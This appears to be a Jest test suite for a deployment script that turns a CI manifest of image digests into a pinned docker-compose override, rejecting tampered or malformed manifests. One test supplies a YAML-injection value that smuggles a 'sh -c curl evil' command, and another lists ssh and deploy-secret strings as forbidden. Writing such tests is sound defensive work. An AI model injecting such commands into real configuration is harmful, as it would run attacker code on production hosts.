import { existsSync, mkdtempSync, rmSync, writeFileSync, readFileSync } from 'fs';
import { tmpdir } from 'os';
import { join, resolve } from 'path';

/**
 * ═══ "PINNED BY DIGEST" HAS TO BE SOMETHING A HOST CONSUMES ═══
 *
 * The candidate workflow publishes a manifest naming five images by immutable
 * digest. On its own that changes nothing: the host starts containers from
 * `docker-compose.prod.yml`, which resolves images by `IMAGE_TAG` — a tag,
 * which can be moved, and which falls back to `latest`.
 *
 * These tests are about the half that closes the gap, and they are written
 * around the ways it could look fine and mean nothing: a tag where a digest
 * belongs, a truncated digest, a service missing from the file, a container
 * running an image nobody can trace to a build.
 */

const SCRIPT = resolve(__dirname, '..', '..', '..', '..', '..',
    'infra', 'scripts', 'apply-candidate-manifest.cjs');

// A .cjs script, loaded the way the command line loads it. Importing it
// would compile a copy; requiring it exercises the file CI runs.
// eslint-disable-next-line @typescript-eslint/no-require-imports
const consumer = require(SCRIPT);

const SHA = 'a'.repeat(40);
const digest = (seed: string) => `sha256:${seed.repeat(64).slice(0, 64)}`;

/** The eight ids and keys whose provenance the manifest records as a digest. */
const BUILD_INPUT_DIGESTS = {
    NEXT_PUBLIC_META_APP_ID: '0123456789abcdef',
    NEXT_PUBLIC_META_CONFIG_ID: '1123456789abcdef',
    NEXT_PUBLIC_META_SOLUTION_ID: '2123456789abcdef',
    NEXT_PUBLIC_GOOGLE_CLIENT_ID: '3123456789abcdef',
    NEXT_PUBLIC_MESSENGER_FB_LOGIN_CONFIG_ID: '4123456789abcdef',
    NEXT_PUBLIC_VAPID_PUBLIC_KEY: '5123456789abcdef',
    NEXT_PUBLIC_INSTAGRAM_APP_ID: '6123456789abcdef',
    NEXT_PUBLIC_INSTAGRAM_REDIRECT_URI: '7123456789abcdef',
};

const manifest = (over: Record<string, unknown> = {}) => ({
    version: 3,
    sha: SHA,
    verification: {
        workflow: 'candidate',
        runId: '1234567890',
        runAttempt: '1',
        repository: 'Nipko/sales-structure',
        conclusion: 'success',
    },
    dashboardBuildInputs: {
        urls: {
            NEXT_PUBLIC_API_URL: 'https://api.parallly-chat.cloud',
            NEXT_PUBLIC_WA_SERVICE_URL: 'https://wa.parallly-chat.cloud',
        },
        digests: { ...BUILD_INPUT_DIGESTS },
    },
    images: {
        api: { tag: 'ghcr.io/nipko/parallext-api:candidate-' + SHA, digest: digest('1') },
        worker: { tag: 'ghcr.io/nipko/parallext-worker:candidate-' + SHA, digest: digest('2') },
        dashboard: { tag: 'ghcr.io/nipko/parallext-dashboard:candidate-' + SHA, digest: digest('3') },
        whatsapp: { tag: 'ghcr.io/nipko/parallext-whatsapp:candidate-' + SHA, digest: digest('4') },
        landing: { tag: 'ghcr.io/nipko/parallext-landing:candidate-' + SHA, digest: digest('5') },
    },
    ...over,
});

const withFile = <T>(content: unknown, use: (file: string) => T): T => {
    const dir = mkdtempSync(join(tmpdir(), 'candidate-manifest-'));
    try {
        const file = join(dir, 'manifest.json');
        writeFileSync(file, JSON.stringify(content), 'utf8');
        return use(file);
    } finally {
        rmSync(dir, { recursive: true, force: true });
    }
};

describe('reading the manifest', () => {
    it('resolves every image to a repository and a digest', () => {
        const parsed = withFile(manifest(), file => consumer.readManifest(file));
        expect(parsed.images.api.reference)
            .toBe(`ghcr.io/nipko/parallext-api@${digest('1')}`);
        // The tag is thrown away on purpose: it is the mutable half, and the
        // whole point of the manifest is to stop depending on it.
        expect(parsed.images.api.reference).not.toContain('candidate-');
    });

    it('refuses a manifest that names a tag where a digest belongs', () => {
        const broken = manifest();
        (broken.images as any).api.digest = 'candidate-' + SHA;
        expect(() => withFile(broken, file => consumer.readManifest(file)))
            .toThrow(/no sha256 digest/);
    });

    it('refuses a truncated digest', () => {
        // Long enough to look right in a review, short enough to name nothing.
        const broken = manifest();
        (broken.images as any).worker.digest = 'sha256:abc123';
        expect(() => withFile(broken, file => consumer.readManifest(file)))
            .toThrow(/no sha256 digest/);
    });

    it('refuses a manifest that is missing a service entirely', () => {
        const broken = manifest();
        delete (broken.images as any).landing;
        expect(() => withFile(broken, file => consumer.readManifest(file)))
            .toThrow(/names no image for "landing"/);
    });

    it('refuses a manifest with no commit behind it', () => {
        expect(() => withFile(manifest({ sha: 'main' }), file => consumer.readManifest(file)))
            .toThrow(/no full commit sha/);
    });
});

describe('a manifest is untrusted input', () => {
    /**
     * It arrives as a downloaded artefact and decides what a production host
     * starts. The interesting attacks are not exotic — they are a file that
     * looks right, and each of these is one.
     */
    const refuses = (over: Record<string, unknown>, fragment: string) => {
        expect(() => withFile(manifest(over), file => consumer.readManifest(file)))
            .toThrow(fragment);
    };

    it('refuses a version it was not written for', () => {
        // Version 1 named tags; version 2 names digests; version 3 also names
        // the run that verified them. Reading a version-2 file with version-3
        // rules would accept a manifest no green run stands behind.
        refuses({ version: 1 }, 'is not 3');
        refuses({ version: 2 }, 'is not 3');
        refuses({ version: undefined }, 'is not 3');
        refuses({ version: '3' }, 'is not 3');
    });

    it('refuses a repository that is not ours', () => {
        // A perfectly valid digest of somebody else's image. This is the check
        // a digest cannot make for itself.
        refuses({ images: { ...manifest().images,
            api: { tag: 'ghcr.io/someone-else/parallext-api:candidate-' + SHA, digest: digest('1') } },
        }, 'not one of');
    });

    describe('a repository that is ours and belongs to a different service', () => {
        /**
         * ═══ THE MUTATION: SWAP API AND DASHBOARD ═══
         *
         * Reproduced before it was fixed. The reader checked each repository
         * against a LIST of five, so a manifest in which `api` names the
         * dashboard image and `dashboard` names the API image was accepted and
         * the generator wrote, exit code 0:
         *
         *     api:       image: ghcr.io/nipko/parallext-dashboard@sha256:14c2…
         *     dashboard: image: ghcr.io/nipko/parallext-api@sha256:66cd…
         *
         * Nothing else could catch it. Both digests are real. Both repositories
         * are ours. The expected tag is derived FROM the repository, so
         * `candidate-<sha>` matches whichever one is there. The host starts a
         * Next.js server where the API belongs, both health checks fail, and the
         * failure reads like a bad build — during a window with the write
         * barrier already down.
         */
        const swapped = () => {
            const images = manifest().images as Record<string, { tag: string; digest: string }>;
            return { images: { ...images,
                api: { tag: images.dashboard.tag.replace('candidate-', 'candidate-'), digest: images.api.digest },
                dashboard: { tag: images.api.tag, digest: images.dashboard.digest } } };
        };

        it('is refused, and names both the service and the image it was handed', () => {
            refuses(swapped(), 'which is the "dashboard" image');
            refuses(swapped(), 'may only be started from "ghcr.io/nipko/parallext-api"');
        });

        it('writes no override file when it refuses', () => {
            // A refusal that still leaves a compose override on disk is a
            // refusal somebody can `-f` by accident.
            const dir = mkdtempSync(join(tmpdir(), 'candidate-manifest-swap-'));
            try {
                const file = join(dir, 'manifest.json');
                const out = join(dir, 'docker-compose.candidate.yml');
                writeFileSync(file, JSON.stringify(manifest(swapped())), 'utf8');
                expect(() => consumer.readManifest(file)).toThrow();
                expect(existsSync(out)).toBe(false);
            } finally {
                rmSync(dir, { recursive: true, force: true });
            }
        });

        it('holds for every pair, not just the one that was reported', () => {
            // The bug was a missing per-service identity, so the fix has to be
            // per service. Twenty ordered pairs; every one of them a refusal.
            const keys = Object.keys(consumer.SERVICES) as string[];
            const base = manifest().images as Record<string, { tag: string; digest: string }>;
            for (const key of keys) {
                for (const other of keys) {
                    if (key === other) continue;
                    expect({ key, other, refused: (() => {
                        try {
                            withFile(manifest({ images: { ...base, [key]: {
                                tag: base[other].tag, digest: base[key].digest } } }),
                            file => consumer.readManifest(file));
                            return false;
                        } catch { return true; }
                    })() }).toEqual({ key, other, refused: true });
                }
            }
        });

        it('maps each service to exactly one repository, with no service left out', () => {
            // The map is what makes the check possible; a service missing from
            // it would fall back to "any of ours" without anything going red.
            expect(consumer.REPOSITORY_OF).toEqual({
                api: 'ghcr.io/nipko/parallext-api',
                worker: 'ghcr.io/nipko/parallext-worker',
                dashboard: 'ghcr.io/nipko/parallext-dashboard',
                whatsapp: 'ghcr.io/nipko/parallext-whatsapp',
                landing: 'ghcr.io/nipko/parallext-landing',
            });
            expect(Object.keys(consumer.REPOSITORY_OF).sort())
                .toEqual(Object.keys(consumer.SERVICES).sort());
            expect(new Set(Object.values(consumer.REPOSITORY_OF)).size).toBe(5);
        });
    });

    it('refuses a tag that does not name this commit', () => {
        // The tag is discarded when the override is written, and it still has
        // to be right: a manifest whose tag disagrees with its own commit was
        // produced by something that is not the candidate workflow.
        refuses({ images: { ...manifest().images,
            api: { tag: 'ghcr.io/nipko/parallext-api:latest', digest: digest('1') } },
        }, 'is tagged');
        refuses({ images: { ...manifest().images,
            api: { tag: 'ghcr.io/nipko/parallext-api:candidate-' + 'b'.repeat(40), digest: digest('1') } },
        }, 'is tagged');
    });

    it('refuses a value that could break out of the YAML line', () => {
        // The override is YAML written by hand. A newline ends the line and
        // starts a new key, so a crafted value could add a `command:` or a
        // `volumes:` entry to a service. Refused rather than sanitised:
        // sanitising would silently change what the host runs.
        for (const hostile of [
            'ghcr.io/nipko/parallext-api' + String.fromCharCode(10)
                + '    command: [sh, -c, curl evil]',
            'ghcr.io/nipko/parallext-api # comment',
            'ghcr.io/nipko/parallext-api with space',
            "ghcr.io/nipko/parallext-api'",
        ]) {
            refuses({ images: { ...manifest().images,
                api: { tag: hostile + ':candidate-' + SHA, digest: digest('1') } },
            }, 'cannot appear');
        }
    });

    it('refuses a URL where an image reference belongs', () => {
        refuses({ images: { ...manifest().images,
            api: { tag: 'https://ghcr.io/nipko/parallext-api:candidate-' + SHA, digest: digest('1') } },
        }, 'looks like a URL');
    });

    describe('the four things a manifest has to bind together', () => {
        /**
         * A file naming five digests and nothing else can be written by a RED
         * run — the old workflow proved it could: `upload-artifact` carried
         * `if: always()`, so a run whose suite failed still published a
         * consumable manifest, and the cut-over's first step is to download
         * exactly that artefact and turn it into what a production host starts.
         */
        it('refuses a manifest with no verification run behind it', () => {
            refuses({ verification: undefined }, 'names no verification run');
            refuses({ verification: {} }, 'not "success"');
        });

        it('refuses a verification that concluded anything but success', () => {
            for (const conclusion of ['failure', 'cancelled', 'skipped', '', 'SUCCESS']) {
                refuses({ verification: { runId: '1', conclusion } }, 'not "success"');
            }
        });

        it('refuses a green verification that names no run', () => {
            // "It passed" with no run id is a sentence, not evidence: nobody can
            // open the log and see what passed.
            refuses({ verification: { conclusion: 'success' } }, 'names no run id');
            refuses({ verification: { conclusion: 'success', runId: 'latest' } }, 'names no run id');
        });

        it('refuses a manifest that does not record what the bundle was built from', () => {
            // A missing `NEXT_PUBLIC_*` does not fail a Next.js build: it bakes
            // an empty string. The manifest is the only place that says which
            // values the approved bundle carries.
            refuses({ dashboardBuildInputs: undefined }, 'records no dashboard build inputs');
            refuses({ dashboardBuildInputs: { urls: {}, digests: { ...BUILD_INPUT_DIGESTS } } },
                'do not record NEXT_PUBLIC_API_URL');
            const short = { ...BUILD_INPUT_DIGESTS, NEXT_PUBLIC_VAPID_PUBLIC_KEY: '' };
            refuses({ dashboardBuildInputs: {
                urls: { NEXT_PUBLIC_API_URL: 'https://a', NEXT_PUBLIC_WA_SERVICE_URL: 'https://b' },
                digests: short } }, 'do not record a digest for NEXT_PUBLIC_VAPID_PUBLIC_KEY');
        });

        it('carries the commit, the run, the inputs and five digests into what it returns', () => {
            const parsed = withFile(manifest(), file => consumer.readManifest(file));
            expect(parsed.sha).toBe(SHA);
            expect(parsed.verification).toEqual({ runId: '1234567890', conclusion: 'success' });
            expect(parsed.buildInputs.urls.NEXT_PUBLIC_API_URL).toBe('https://api.parallly-chat.cloud');
            expect(Object.keys(parsed.buildInputs.digests).sort())
                .toEqual(Object.keys(BUILD_INPUT_DIGESTS).sort());
            expect(Object.keys(parsed.images)).toHaveLength(5);
        });

        it('writes the run that verified it into the override a host reads', () => {
            const parsed = withFile(manifest(), file => consumer.readManifest(file));
            expect(consumer.renderOverride(parsed)).toContain('Verified by run 1234567890');
        });
    });

    it('still accepts the manifest the workflow actually writes', () => {
        // The control. Every refusal above is worthless if the real shape is
        // refused too, and this is the shape `candidate.yml` emits.
        const parsed = withFile(manifest(), file => consumer.readManifest(file));
        expect(parsed.version).toBe(3);
        expect(Object.keys(parsed.images).sort())
            .toEqual(['api', 'dashboard', 'landing', 'whatsapp', 'worker']);
    });
});

describe('the compose override it writes', () => {
    it('names every service by digest and nothing by tag', () => {
        const parsed = withFile(manifest(), file => consumer.readManifest(file));
        const yaml = consumer.renderOverride(parsed) as string;
        for (const service of Object.values(consumer.SERVICES) as string[]) {
            expect(yaml).toContain(`  ${service}:`);
        }
        for (const line of yaml.split('\n').filter(line => line.trim().startsWith('image:'))) {
            expect(line).toMatch(/image: [^:@\s]+(?::[0-9]+)?\/[^@\s]+@sha256:[0-9a-f]{64}$/);
        }
        // `latest` is what the production compose falls back to. It must not be
        // reachable from a file whose purpose is to pin.
        expect(yaml).not.toContain('latest');
    });

    it('says it is generated, so nobody edits it by hand', () => {
        const parsed = withFile(manifest(), file => consumer.readManifest(file));
        expect(consumer.renderOverride(parsed)).toContain('GENERATED');
    });
});

describe('verifying what is actually running', () => {
    const parsed = () => withFile(manifest(), file => consumer.readManifest(file));

    const running = (over: Record<string, unknown> = {}) => ({
        api: { configImage: 'x', repoDigests: [`ghcr.io/nipko/parallext-api@${digest('1')}`] },
        worker: { configImage: 'x', repoDigests: [`ghcr.io/nipko/parallext-worker@${digest('2')}`] },
        dashboard: { configImage: 'x', repoDigests: [`ghcr.io/nipko/parallext-dashboard@${digest('3')}`] },
        whatsapp: { configImage: 'x', repoDigests: [`ghcr.io/nipko/parallext-whatsapp@${digest('4')}`] },
        landing: { configImage: 'x', repoDigests: [`ghcr.io/nipko/parallext-landing@${digest('5')}`] },
        ...over,
    });

    it('is silent when every container is the approved build', () => {
        expect(consumer.verify(parsed(), running())).toEqual([]);
    });

    it('names the service running something else', () => {
        const problems = consumer.verify(parsed(), running({
            dashboard: { configImage: 'x',
                repoDigests: [`ghcr.io/nipko/parallext-dashboard@${digest('9')}`] },
        }));
        expect(problems).toHaveLength(1);
        expect(problems[0]).toContain('dashboard');
        expect(problems[0]).toContain(digest('3'));
    });

    it('treats a locally built image as a mismatch, not as unknown', () => {
        // No registry digest means it was built on the host or loaded from a
        // tarball: nothing ties it to the bytes anybody reviewed, and calling
        // that "cannot tell" would let it pass.
        const problems = consumer.verify(parsed(), running({
            api: { configImage: 'parallext-api:local', repoDigests: [] },
        }));
        expect(problems[0]).toContain('no registry digest');
    });

    it('notices a service that is not running at all', () => {
        const state = running();
        delete (state as any).worker;
        expect(consumer.verify(parsed(), state)).toEqual(['worker: not running']);
    });

    it('is not fooled by the right digest on the wrong repository', () => {
        // A digest is only unique within a repository. Comparing the hash alone
        // would accept an image pushed to a different repository entirely.
        const problems = consumer.verify(parsed(), running({
            landing: { configImage: 'x', repoDigests: [`ghcr.io/someone-else/landing@${digest('5')}`] },
        }));
        expect(problems).toHaveLength(1);
        expect(problems[0]).toContain('landing');
    });
});

describe('the candidate workflow that produces it', () => {
    const workflow = () => readFileSync(
        resolve(__dirname, '..', '..', '..', '..', '..', '.github', 'workflows', 'candidate.yml'), 'utf8');

    it('can be started before the merge', () => {
        // `workflow_dispatch` only appears for workflows on the DEFAULT branch,
        // so a candidate workflow written on a branch is unreachable from
        // exactly the branch it exists to validate.
        expect(workflow()).toContain('pull_request:');
    });

    it('still cannot deploy', () => {
        // The safety of this file is a property somebody could remove in one
        // line while adding a feature.
        const text = workflow();
        for (const forbidden of ['SERVER_HOST', 'SERVER_SSH_KEY', 'appleboy/ssh-action', 'ssh ']) {
            expect({ forbidden, present: text.includes(forbidden) })
                .toEqual({ forbidden, present: false });
        }
    });

    it('never tags an image `latest`', () => {
        // `docker-compose.prod.yml` falls back to `latest`, so a candidate
        // tagged that way becomes what a manual `up` on the VPS starts.
        expect(workflow()).not.toMatch(/:latest\b/);
    });

    it('bakes every public build input the dashboard reads', () => {
        // A missing `NEXT_PUBLIC_*` does not fail a Next.js build: it bakes an
        // empty string, and the candidate ships with Embedded Signup that
        // cannot open and a Google button that cannot sign in — a product
        // nobody is shipping, validated as if it were.
        const text = workflow();
        for (const name of [
            'NEXT_PUBLIC_API_URL', 'NEXT_PUBLIC_WA_SERVICE_URL', 'NEXT_PUBLIC_META_APP_ID',
            'NEXT_PUBLIC_META_CONFIG_ID', 'NEXT_PUBLIC_META_SOLUTION_ID',
            'NEXT_PUBLIC_GOOGLE_CLIENT_ID', 'NEXT_PUBLIC_MESSENGER_FB_LOGIN_CONFIG_ID',
            'NEXT_PUBLIC_INSTAGRAM_APP_ID', 'NEXT_PUBLIC_INSTAGRAM_REDIRECT_URI',
            'NEXT_PUBLIC_APP_VERSION', 'NEXT_PUBLIC_VAPID_PUBLIC_KEY',
        ]) {
            expect({ name, baked: text.includes(`${name}=`) }).toEqual({ name, baked: true });
        }
    });

    it('consumes its own manifest before publishing it', () => {
        // "Pinned by digest" stays a claim until something reads the file and
        // turns it into what a host runs.
        expect(workflow()).toContain('apply-candidate-manifest.cjs');
    });
});
